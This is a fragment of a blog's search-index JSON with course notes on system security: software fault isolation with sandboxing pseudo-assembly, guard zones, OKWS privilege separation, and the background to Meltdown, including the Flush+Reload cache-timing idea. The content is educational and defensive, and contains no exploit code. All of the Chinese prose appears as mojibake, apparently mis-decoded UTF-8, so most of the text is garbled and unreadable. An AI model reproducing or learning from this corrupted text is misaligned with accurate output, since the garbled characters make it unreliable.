è½½åˆ°åº”ç”¨ç¨‹åºçš„å†…å­˜é‡Œã€‚æˆ‘ä»¬å¦‚ä½•ä¿è¯è¿™äº›æ’ä»¶å¯¹æˆ‘ä»¬åº”ç”¨æœ¬èº«äº§ç”Ÿè´Ÿé¢å½±å“ï¼Œæ¯”å¦‚æ¶æ„è°ƒç”¨åº”ç”¨ä¸­çš„å‡½æ•°ã€è¦†ç›–åº”ç”¨ä¸­çš„æ•°æ®ï¼Ÿå³ä½¿è¿™äº›æ’ä»¶æœ¬èº«ä¸æ˜¯æ¶æ„è½¯ä»¶ï¼Œæˆ‘ä»¬å¦‚ä½•é¿å…æ”»å‡»è€…åˆ©ç”¨æ’ä»¶æ¼æ´è®¿é—®åˆ°åº”ç”¨ç¨‹åºæœ¬èº«çš„å†…å­˜ï¼Œä»è€Œæ”»å‡»åº”ç”¨ç¨‹åºï¼Ÿ å¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—ä¸å—ä¿¡ä»»çš„ä»£ç åªèƒ½è¯»å†™è‡ªå·±çš„é‚£å—å†…å­˜ï¼Œè¿è¡Œè‡ªå·±çš„ä»£ç ï¼Œå¹¶é€šè¿‡æ­£ç¡®çš„å…¥å£æ¥è°ƒç”¨åº”ç”¨ç¨‹åºä¸­çš„æŒ‡å®šå‡½æ•°ã€‚ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥è¿›ç¨‹éš”ç¦»ï¼Œç›¸äº’ä¹‹é—´é€šè¿‡ RPC æ¥è°ƒç”¨ï¼Œè¿™å½“ç„¶è¾¾åˆ°äº†ç›®çš„ï¼Œç„¶è€Œè¿™ä¹Ÿä½¿å¾—â€œæ’ä»¶â€çš„å¤±å»äº†é€æ˜æ€§ï¼Œå¹¶å¼•å…¥äº†å·¨å¤§çš„è¿›ç¨‹åˆ‡æ¢å¼€é”€ã€‚ SFI åˆ™å°†æ’ä»¶çš„ä»£ç å’Œæ•°æ®æ”¾åœ¨äº†ä¸€ä¸ªæ²™ç›’ä¸­ã€‚æ²™ç›’ä¸­çš„å†…å­˜å†™å…¥å’Œè·³è½¬æŒ‡ä»¤éƒ½ä¼šè¢«æ£€æŸ¥ï¼Œé˜²æ­¢å†™å…¥æˆ–è·³è½¬åˆ°éæ³•å†…å­˜åŒºåŸŸã€‚å¼€å‘è€…é€šè¿‡ sandboxer æŠŠä»£ç æ‰“åŒ…è¿›æ²™ç›’ï¼Œè€Œç”¨æˆ·åˆ™é€šè¿‡ verifier æ£€æŸ¥æ²™ç›’çš„æœ‰æ•ˆæ€§ã€‚è¿™æ ·çš„å¥½å¤„åœ¨äºï¼Œç”¨æˆ·ä¸éœ€è¦å…³å¿ƒè¾ƒä¸ºå¤æ‚çš„ sandboxer æ˜¯å¦å¯ä¿¡ä»»ï¼Œåªéœ€è¦ç¡®ä¿è¾ƒç®€å•çš„ verifier å¯ä¿¡å³å¯ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:15:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Fault Domain SFI å°†ä¸å—ä¿¡ä»»çš„ä»£ç é™åˆ¶åœ¨ä¸€ä¸ª Fault Domain ä¸­ï¼Œä¸€ä¸ª Fault Domain åŒ…æ‹¬ï¼š å”¯ä¸€çš„ IDï¼Œç”¨äº syscall è®¿é—®æ§åˆ¶ ä»£ç æ®µ æ•°æ®æ®µ ä¸€èˆ¬é•¿è¿™æ ·ï¼š 0x10000000 -------------- -- | | | | Code Segment | | | | | 0x100fffff -------------- | 0x10100000 -------------- } Fault Domain | | | | Data Segment | | | | | 0x101fffff -------------- -- 0x10200000 â¬‡ï¸ app memory åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ®µ ID ä¸ºå‰ä¸‰ä½ï¼Œå³å‰ 12 bitsï¼Œä»£ç æ®µå’Œæ•°æ®æ®µçš„æ®µ ID æ˜¯ä¸åŒçš„ã€‚ä¸å—ä¿¡ä»»çš„ä»£ç åªèƒ½åœ¨ä»£ç æ®µå†…è·³è½¬ï¼Œåœ¨æ•°æ®æ®µå†…å†™å…¥ã€‚å¯¹äºé™æ€çš„è·³è½¬å’Œå†™å…¥ï¼Œä¾‹å¦‚ JUMP 0x10030000ï¼Œåªè¦æ£€æŸ¥ç›®æ ‡åœ°å€å°±è¡Œï¼Œå¾ˆå®¹æ˜“åšåˆ°ã€‚è€Œå¯¹äºåŠ¨æ€çš„æƒ…å†µï¼Œå°±éœ€è¦è¯¦ç»†è®¨è®ºäº†ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:15:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"é—´æ¥å†…å­˜è®¿é—® æ¯”å¦‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸€æ¡æŒ‡ä»¤ï¼š STORE R0, R1 ; write R1 to Mem[R0] Sandboxer ä¼šåˆ©ç”¨å—ä¿¡ä»»çš„ä¸“ç”¨å¯„å­˜å™¨ Ra,Rc,Rdï¼Œé‡å†™æŒ‡ä»¤ä¸ºï¼š MOV Ra, R0 ; copy R0 into Ra SHR Rb, Ra, Rc ; Rb = Ra \u003e\u003e Rc, to get segment ID CMP Rb, Rd ; Rd holds correct data segment ID BNE fault ; wrong data segment ID STORE Ra, R1 ; Ra in data segment, so do write æˆ‘ä»¬çŸ¥é“ï¼Œå½“æ‰§è¡Œåˆ°æœ€åä¸€è¡Œæ—¶ R0 å·²ç»é€šè¿‡äº†æ£€æŸ¥ã€‚ä¸ºä»€ä¹ˆæœ€åè¿˜æ˜¯ç”¨ STORE Ra, R1 è€Œä¸æ˜¯ç›´æ¥åƒåŸæ¥é‚£æ · STORE R0, R1 å‘¢ï¼Ÿå› ä¸ºç¬¬äºŒç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å®Œå…¨å¯ä»¥è·³è¿‡ä¸­é—´çš„æ£€æŸ¥ç›´æ¥å†™å…¥ï¼Œè€Œç¬¬ä¸€ç§æƒ…å†µä¸‹æ”»å‡»è€…æ— æ³•ç¯¡æ”¹ä¸“ç”¨å¯„å­˜å™¨ Ra çš„å€¼ã€‚ æ­¤æ—¶ï¼Œæ²™ç›’çš„å¼•å…¥å¯¹äºæ¯æ¡é—´æ¥å†…å­˜è®¿é—®æŒ‡ä»¤è€Œè¨€ï¼Œé¢å¤–å¢åŠ äº†å››æ¡æŒ‡ä»¤ï¼Œå¹¶ä½¿ç”¨äº† 6 ä¸ªå¯„å­˜å™¨ï¼Œå…¶ä¸­ 5 ä¸ªæ˜¯ä¸“ç”¨å¯„å­˜å™¨ï¼ˆä¾‹å­ä¸­ä½¿ç”¨äº†ä¸‰ä¸ªä¸“ç”¨å¯„å­˜å™¨ï¼Œæ­¤å¤–è¿˜éœ€è¦ä¸¤ä¸ªä¸“ç”¨å¯„å­˜å™¨æ¥ sanbox ä¸å®‰å…¨çš„ä»£ç åœ°å€ï¼‰ï¼Œå¼€é”€å¾ˆå¤§ã€‚èƒ½ä¸èƒ½å‡å°ä¸€ç‚¹å¼€é”€å‘¢ï¼Ÿ æ–¹æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸æ£€æŸ¥ç›®æ ‡åœ°å€æ˜¯å¦åœ¨åˆæ³•æ®µä¸­ï¼Œç›´æ¥å¼ºè¡Œè®©å®ƒå¤„äºåˆæ³•æ®µä¸­ï¼š AND Ra, R0, Re ; clear segment ID bits in Ra OR Ra, Ra, Rf ; set segment ID to correct value STORE Ra, R1 ; do write to safe target address æ­¤æ—¶åªéœ€è¦å¢åŠ  2 æ¡é¢å¤–æŒ‡ä»¤ï¼Œä½¿ç”¨ 5 ä¸ªä¸“ç”¨å¯„å­˜å™¨ã€‚åŒç†ï¼Œé—´æ¥è·³è½¬æŒ‡ä»¤ JR R0 ä¹Ÿç±»ä¼¼ï¼š AND Rg, R0, Re ; clear segment ID bits in Rg OR Rg, Rg, Rh ; set segment ID to correct value JR Rg ; do jump to safe target address ","date":"2021-10-18","objectID":"/distributed-systems/:15:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Guard Zones æœ‰æ—¶ï¼Œæˆ‘ä»¬è¿˜ä¼šé‡åˆ°å¯„å­˜å™¨+åç§»é‡ç±»å‹çš„åœ°å€ï¼Œè¿™æ—¶ SFI å°±éœ€è¦å¤šä¸€æ­¥ ADD æ“ä½œã€‚ä¸ºäº†çœå»è¿™ä¸€æ“ä½œå¹¶ç¡®ä¿ç»“æœä»ç„¶åœ¨åˆæ³•æ®µä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°åç§»é‡çš„å¤§å°å—åˆ°æŒ‡ä»¤é•¿åº¦å½±å“ï¼ˆåœ¨è®ºæ–‡ä¸­çš„ MIPS æ¶æ„ä¸‹æ˜¯ 64Kï¼‰ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ®µä¸¤ç«¯å¡«ä¸Š unmapped çš„ Guard Zone å°±å¯ä»¥å·§å¦™è§£å†³è¿™ä¸€é—®é¢˜ï¼š 0x0fff0000 -------------- -- | Guard Zone | | 0x10000000 -------------- | | | | | Code Segment | | | | | 0x100fffff -------------- | | Guard Zone | | 0x1010ffff -------------- } Fault Domain 0x101f0000 -------------- | | Guard Zone | | 0x10200000 -------------- | | | | | Data Segment | | | | | 0x102fffff -------------- | | Guard Zone | | 0x1030ffff -------------- -- 0x10310000 â¬‡ï¸ app memory åœ¨ sanboxing çš„æ—¶å€™ï¼Œç›´æ¥æ— è§†åç§»é‡ï¼Œçœå»ä¸€æ¬¡ ADD æŒ‡ä»¤ï¼Œè€Œåè®¿é—®åˆ° Guard Zone æ—¶åˆ™è§¦å‘ Trapã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:15:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å±€é™æ€§ä¸æ‹“å±• è®ºæ–‡ä¸­ SFI åº”ç”¨äº MIPS æŒ‡ä»¤é›†ï¼Œä¸€ä¸ªæœ€é‡è¦çš„å¥½å¤„æ˜¯ MIPS æŒ‡ä»¤é›†æŒ‡ä»¤é•¿åº¦æ˜¯å›ºå®šçš„ã€‚ç„¶è€Œï¼Œx86 æ¶æ„ä¸‹æŒ‡ä»¤é•¿åº¦ä¸å›ºå®šï¼Œæ„å‘³ç€è·³è½¬æ“ä½œå¯èƒ½è·³è½¬åˆ°æŒ‡ä»¤ä¸­é—´éƒ¨åˆ†ï¼Œé€ æˆéš¾ä»¥é¢„æœŸçš„ç»“æœã€‚åŒæ—¶ï¼Œx86 ä¹Ÿåªæœ‰ 4 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œå¾ˆéš¾æ»¡è¶³é‚£ä¹ˆå¤šä¸“ç”¨å¯„å­˜å™¨çš„è¦æ±‚ã€‚ Google çš„ NativeClient å¯ä»¥çœ‹ä½œæ˜¯ SFI åœ¨ x86, x86-64 å’Œ ARM æ¶æ„ä¸Šçš„å®ç°ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è®©æµè§ˆå™¨èƒ½æ‰§è¡Œæµè§ˆå™¨æ’ä»¶çš„ä»£ç ã€‚å¦‚ä»Š NativeClient å·²ç»è¢« Web Assembly å–ä»£ã€‚ å¦ä¸€ç§ç±»ä¼¼çš„æŠ€æœ¯ CFI åˆ™å¯ä»¥åœ¨ x86 ä¸Šè¿è¡Œï¼Œä½†æ˜¯åŸç†å’Œ SFI å¾ˆä¸ä¸€æ ·ï¼Œä¸»è¦æ˜¯æ£€æŸ¥æ§åˆ¶æµå›¾ CFG åˆ¤å®šè·³è½¬æ˜¯å¦åˆæ³•ï¼Œå› æ­¤ä¹Ÿä¸éœ€è¦ä¸“ç”¨å¯„å­˜å™¨ã€‚clang / LLVM ç°åœ¨å°±åŒ…æ‹¬äº† CFI çš„å®ç°ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:15:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"OKWS ç ”ç©¶äº†è¿™ä¹ˆå¤šé˜²å¾¡æœºåˆ¶åï¼Œç»ˆäºæœ‰äººæ„è¯†åˆ°é˜²æ˜¯é˜²ä¸ä½çš„ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯åœ¨é­å—æˆåŠŸçš„æ”»å‡»ä¹‹åå°†æŸå¤±é™åˆ°æœ€ä½ã€‚å› æ­¤ï¼Œéœ€è¦éµå¾ªæœ€å°ç‰¹æƒåŸåˆ™ã€éœ€è¦å°†ç³»ç»Ÿåˆ’åˆ†ä¸ºå­ç³»ç»Ÿã€éœ€è¦ä¸¥æ ¼å®šä¹‰æ¥å£çš„èŒƒå›´ã€éœ€è¦ä¸¥æ ¼æ§åˆ¶æˆæƒçš„ç²’åº¦ã€‚ å¯¹äºæš´éœ²åœ¨å¤–çš„æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼Œåº”å°½å¯èƒ½å‡å°‘å…¶æ‰€èƒ½æ‹¥æœ‰çš„æƒé™ã€‚ä¾‹å¦‚ SSH åº”é…ç½®ä¸ºç¦æ­¢ root ç™»é™†ã€‚é‚£ä¹ˆå¦‚ä½•å°†ç³»ç»Ÿåˆ’åˆ†ä¸ºå­ç³»ç»Ÿï¼Ÿè¿™å°±éœ€è¦è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹ç”±ä¸åŒçš„ç”¨æˆ·è¿è¡Œï¼Œæ‹¥æœ‰ä¸åŒçš„æƒé™ï¼Œå€ŸåŠ© Unix éš”ç¦»æœºåˆ¶é˜²æ­¢ç”¨æˆ·è¯»å– / ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€‚ Unix ä¹Ÿæä¾›äº†è¿™æ ·çš„ä¸€ä¸ªå·¥å…·ï¼šchrootã€‚å®ƒå°†è¿›ç¨‹è§†è§’ä¸­çš„æ ¹ç›®å½•æ”¹ä¸ºæŸä¸ªç‰¹å®šçš„ç›®å½•ï¼Œè¿™æ ·è¿›ç¨‹å°±æ— æ³•è®¿é—®é‚£ä¸ªç›®å½•ä»¥ä¸Šçš„ä»»ä½•ç›®å½•äº†ã€‚è¿™æ ·ä¹Ÿå¯¼è‡´ä¸€äº›ç³»ç»Ÿæ–‡ä»¶å¿…é¡»é¢„å…ˆæ”¾åˆ°è¦ chroot çš„ç›®å½•ä¸‹ï¼Œæ¯”å¦‚å…±äº«åº“ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚ ä¸€ç§é¿å…è¿™ç±»éº»çƒ¦çš„æ–¹æ³•æ˜¯åœ¨é«˜æƒé™çˆ¶è¿›ç¨‹ä¸­ open æ–‡ä»¶ï¼Œå°† fd ä¼ é€’ç»™ä½æƒé™çš„ã€è¢« chroot çš„å­è¿›ç¨‹ã€‚è¿™æ ·å­è¿›ç¨‹ä¸éœ€è¦ open æ–‡ä»¶ä¹Ÿèƒ½è¯»å†™è¯¥æ–‡ä»¶ã€‚å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œsocket ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼Œå› æ­¤ç½‘ç»œè¿æ¥ä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼å¤„ç†ã€‚ OKWS çš„å…¥å£å°±æ˜¯ä½æƒé™çš„ okdï¼Œå®ƒåœ¨ chroot jail é‡Œæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ HTTP è¯·æ±‚ï¼Œå¤„ç†å¹¶ä¼ é€’åˆ°ç³»ç»Ÿå†…éƒ¨ã€‚å†…éƒ¨çš„è°ƒç”¨åˆ™ä¸»è¦é€šè¿‡ RPC é€šä¿¡ï¼Œå› ä¸ºè¿™æ ·èƒ½æ›´ä¸¥æ ¼åœ°å®šä¹‰é€šä¿¡æ¥å£ã€‚æ¢è€Œè¨€ä¹‹ï¼Œå†…éƒ¨çš„ç»„ä»¶å³ä½¿ä»¥ root è¿è¡Œä¹Ÿæ— éœ€æ‹…å¿ƒï¼Œå› ä¸ºå­ç³»ç»Ÿé—´çš„é€šä¿¡å—åˆ°äº†ä¸¥æ ¼ç®¡æ§ã€‚å½“ç„¶ï¼Œè¿™ä¸€å®šç¨‹åº¦ä¸Šä¹Ÿé™ä½äº†é€æ˜æ€§ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:16:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Meltdown å­¦æœŸæœ€åä¸€ä¸ªä¸»é¢˜è¢«è€å¸ˆç§°ä¸ºâ€œç”œç‚¹â€ï¼Œä»‹ç»äº†ä¸€ç§æœ‰è¶£çš„ç¡¬ä»¶å±‚é¢çš„ä¾§ä¿¡é“æ”»å‡» Meltdownã€‚åœ¨ Meltdown å‡ºç°å‰ï¼Œæˆ‘ä»¬çŸ¥é“æ¯ä¸ªè¿›ç¨‹ä¹‹é—´çš„å†…å­˜æ˜¯éš”ç¦»çš„ï¼ŒOS çš„å†…å­˜å’Œè¿›ç¨‹ä¹‹é—´ä¹Ÿæ˜¯éš”ç¦»çš„ï¼Œå› æ­¤æ¶æ„è¿›ç¨‹æ— æ³•è¯»å–å…¶ä»–è¿›ç¨‹ / OS çš„å†…å­˜ï¼Œç°ä»£å®¹å™¨æŠ€æœ¯çš„éšç§ä¿æŠ¤ä¹Ÿä¾èµ–äºè¿™ä¸€ç‚¹ã€‚ç„¶è€Œ Meltdown å‡ºç°åï¼Œè¿™ä¸€åˆ‡éƒ½ä¸æˆç«‹äº†ã€‚ Meltdown æ˜¯å­˜åœ¨äº CPU ç¡¬ä»¶å±‚é¢çš„æ¼æ´ï¼Œä½¿å¾—æ¶æ„ç¨‹åºå¯ä»¥è¯»å–å†…æ ¸çš„å†…å­˜ã€‚è€Œå†…æ ¸å†…å­˜ä¸­åˆä¿å­˜äº†å…¨éƒ¨ç‰©ç†å†…å­˜çš„æ˜ å°„ï¼Œè¿™åˆä½¿å¾—æ¶æ„ç¨‹åºå¯ä»¥è¯»å–ä»»æ„è¿›ç¨‹çš„å†…å­˜ã€‚å¯¹äºå®¹å™¨æ¥è¯´ï¼Œå®¹å™¨ä¸­çš„æ¶æ„ç¨‹åºå¯ä»¥è¯»å–å…¶ä»–å®¹å™¨çš„å†…å­˜ã€‚ ä¸ºäº†ç†è§£ Meltdownï¼Œéœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†ã€‚è¿™äº›å‰ç½®çŸ¥è¯†åŸºæœ¬éƒ½åœ¨æ“ä½œç³»ç»Ÿè¯¾ä¸Šäº†è§£è¿‡ï¼Œæ‰€ä»¥åªä½œä¸€äº›ç®€å•è®°å½•ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å­˜å‚¨å±‚çº§ å›¾ 5ï½œå­˜å‚¨å±‚çº§ç¤ºæ„å›¾ \" å›¾ 5ï½œå­˜å‚¨å±‚çº§ç¤ºæ„å›¾ è®¡ç®—æœºä¸­çš„å­˜å‚¨å•å…ƒåˆ†ä¸ºå¤šä¸ªå±‚çº§ï¼Œå…¶ä¸­é€Ÿåº¦è¶Šå¿«çš„å•å…ƒå®¹é‡è¶Šå°ï¼ŒCPU åˆ™ä¼˜å…ˆä»é«˜é€Ÿå•å…ƒä¸­è¯»å–æ•°æ®ã€‚è¿™ç§å¤šçº§ç¼“å­˜çš„æ€æƒ³å¤§æ¦‚æ˜¯è®¡ç®—æœºå­˜å‚¨ä¸­æœ€åŸºæœ¬çš„åŸåˆ™ä¹‹ä¸€ã€‚ å½“ CPU ä»ç¼“å­˜ä¸­è¯»å–æ•°æ®æ—¶ï¼Œå¦‚æœå‘½ä¸­ï¼Œé€Ÿåº¦ä¼šå¾ˆå¿«ï¼›å¦‚æœæ²¡èƒ½å‘½ä¸­ï¼Œé‚£å°±ä¸å¾—ä¸ä» DRAM ä¸­è¯»å–æ•°æ®å¹¶æ”¾åˆ°ç¼“å­˜ä¸­ï¼Œä¸è¿‡ç¼“å­˜å®¹é‡æœ‰é™ï¼Œå› æ­¤ä¼šé©±é€ç¼“å­˜ä¸­çš„ä¸€å—æ•°æ®ã€‚å…³äºæŠŠæ–°å—æ”¾åˆ°å“ªé‡Œã€ä»¥åŠé€‰æ‹©å“ªä¸ªå—é©±é€ï¼Œæœ‰å„ç§ä¸åŒçš„ç­–ç•¥ï¼Œä¸åœ¨è¿™é‡Œçš„è®¨è®ºèŒƒå›´å†…ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ç‰©ç†å†…å­˜æ˜ å°„ å›¾ 6ï½œç‰©ç†å†…å­˜æ˜ å°„ \" å›¾ 6ï½œç‰©ç†å†…å­˜æ˜ å°„ æˆ‘ä»¬çŸ¥é“ï¼Œæ¯ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­éƒ½åŒ…å«äº†è¿›ç¨‹åœ°å€ç©ºé—´å’Œå†…æ ¸åœ°å€ç©ºé—´ä¸¤éƒ¨åˆ†ã€‚å¯¹äºè¿›ç¨‹æ¥è¯´ï¼Œåªèƒ½è®¿é—®å‰è€…ã€‚è¿›ç¨‹æ‰€çœ‹åˆ°çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä»¿ä½›æ˜¯æ•´ä¸ªç‰©ç†å†…å­˜ï¼Œå°½ç®¡å®é™…ä¸Šå¹¶éå¦‚æ­¤ã€‚å†…æ ¸ä¼šå°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ä¸åŒçš„ç‰©ç†åœ°å€ä¸Šã€‚ ä¸ºäº†æé«˜æ€§èƒ½å’Œæ–¹ä¾¿å¼€å‘ï¼Œå†…æ ¸åœ°å€ç©ºé—´ä¸­å­˜åœ¨ä¸€æ®µè¿ç»­çš„å†…å­˜åŒºåŸŸï¼Œå­˜æ”¾äº†ç‰©ç†å†…å­˜çš„æ˜ å°„ã€‚å¯ä»¥æƒ³åƒï¼Œå¦‚æœè¿›ç¨‹èƒ½å¤Ÿè®¿é—®è‡ªå·±è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å†…æ ¸éƒ¨åˆ†ï¼Œå°±èƒ½å¤Ÿè®¿é—®åˆ°ç‰©ç†å†…å­˜ä»è€Œè®¿é—®å…¶ä»–è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"CPU æµæ°´çº¿ æ‰€è°“æµæ°´çº¿ï¼Œæˆ–è€…è¯´ Pipeliningï¼Œå°±æ˜¯å°†ä¸€ä¸ªè¿‡ç¨‹åˆ†ä¸ºç‹¬ç«‹çš„ä¸åŒé˜¶æ®µï¼Œéšåè®©å¯¹è±¡æŒ‰é¡ºåºç»è¿‡è¿™äº›é˜¶æ®µï¼Œè¿™æ ·åŒä¸€æ—¶é—´é‡Œå°±å¯ä»¥æœ‰å¤šä¸ªå¯¹è±¡è¢«åŒæ—¶å¤„ç†ã€‚è¿™ç§æ–¹å¼ä¸åƒå¹¶è¡Œé‚£æ ·éœ€è¦å¤šä¸ªæ ¸ï¼Œä¹Ÿä¸åƒé¡ºåºæ‰§è¡Œé‚£æ ·ä¸€æ¬¡åªèƒ½åšä¸€ä»¶äº‹ï¼Œä¸€å®šç¨‹åº¦ä¸Šæé«˜äº†æ•ˆç‡ã€‚ ä¸ºäº†è¿›ä¸€æ­¥æé«˜æ•ˆç‡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å¤šä¸ªæµæ°´çº¿å¹¶å‘æ‰§è¡Œï¼Œæ­¤æ—¶ä¾ç„¶åªéœ€è¦å•æ ¸ï¼š 1 2 3 4 5 6 7 8 9 A B C D E A B C D E A B C D E A B C D E A B C D E åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåœ¨æ—¶åˆ» 5ï¼ŒCPU å¯ä»¥å¹¶å‘å¤„ç† E D C B A äº”é˜¶æ®µçš„ä»»åŠ¡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ä¹±åºæ‰§è¡Œ ç„¶è€Œï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªé˜¶æ®µåœ¨è½®åˆ°å®ƒæ‰§è¡Œæ—¶å°±èƒ½å¤Ÿç«‹å³æ‰§è¡Œï¼Œæ­¤æ—¶ CPU å°±ä¼šç©ºé—²ã€‚ä¸ºäº†é¿å…ç©ºé—²ï¼ŒCPU å¯èƒ½ä¼šå…ˆæ‰§è¡Œé‚£äº›åé¢çš„ã€å·²ç»å‡†å¤‡å¥½ç«‹å³æ‰§è¡Œçš„æ­¥éª¤ï¼Œå¹¶ç¡®ä¿ä¹±åºæ‰§è¡Œä¸ä¼šå½±å“æœ€ç»ˆç»“æœã€‚è¿™ä¸€æœºåˆ¶çš„å¼•å…¥æå¤§å¹…åº¦åœ°æå‡äº† CPU æ€§èƒ½ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:17:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"Flush + Reload ä»‹ç»å®Œäº†èƒŒæ™¯ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ Meltdown ä½¿ç”¨çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œå³ Flush + Reloadã€‚é¦–å…ˆï¼Œå‡å¦‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç¡®å®šä¸€ä¸ªè¿›ç¨‹åœ¨ä¸€æ®µæ—¶é—´å†…æ˜¯å¦è®¿é—®è¿‡å…¶åœ°å€ç©ºé—´ä¸­çš„æŸä¸ªç›®æ ‡åœ°å€ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ©ç”¨ clflush æ¸…ç©ºç¼“å­˜ï¼Œéšåç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œå°è¯•è§¦å‘ä¸€æ¬¡å¯¹ç›®æ ‡åœ°å€çš„è®¿é—®æ“ä½œã€‚ å¦‚æœç”¨æ—¶å¾ˆçŸ­ï¼Œè¿™è¯´æ˜ç¼“å­˜å‘½ä¸­ã€‚å› ä¸ºäº‹å…ˆå·²ç»æ¸…ç©ºäº†ç¼“å­˜ï¼Œæ‰€ä»¥è¿›ç¨‹ä¸€å®šåœ¨æˆ‘ä»¬ç­‰å¾…çš„è¿™æ®µæ—¶é—´é‡Œå·²ç»è®¿é—®è¿‡ç›®æ ‡åœ°å€äº†ã€‚åä¹‹ï¼Œç”¨æ—¶è¾ƒé•¿åˆ™è¯´æ˜åœ¨æ­¤æœŸé—´æ²¡æœ‰è®¿é—®è¿‡ç›®æ ‡åœ°å€ã€‚ 